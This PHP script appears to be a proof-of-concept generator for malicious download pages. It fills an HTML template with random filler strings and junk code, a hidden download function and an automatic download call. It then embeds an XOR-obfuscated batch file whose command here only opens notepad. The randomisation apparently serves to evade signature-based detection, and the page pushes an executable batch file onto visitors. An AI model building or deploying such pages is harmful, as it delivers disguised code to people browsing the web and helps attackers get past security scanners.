<?php
require_once("bicho53-lib.php");

define("INCLUDE_XOR_STREAM",1);

$htmlPage = '
<html>
  <body>
    <!--__random_string__-->
    <!--__random_string2__-->
    <input type="hidden" />
    <!--__random_string__-->
    <script>
    <!--__random_code__-->
    <!--__download_function__-->
    <!--__random_code__-->
    <!--__invoke_download__-->
    <!--__random_code__-->
    </script>
    <!--__random_string__-->
  </body>
</html>
';
$filename = "bicho53-1.txt";
$handle = fopen($filename, "rb");
$fsize = filesize($filename);
$contents = fread($handle, $fsize);

if (defined("INCLUDE_XOR_STREAM")){
  $file = generateBatFile2("bicho53-2.bat.orig",$contents,"start notepad ","txt");
} else {
  $file = generateBatFile1("bicho53-1.bat.orig",$contents,"start notepad ","txt");
}
echo generatePage($htmlPage,$file);
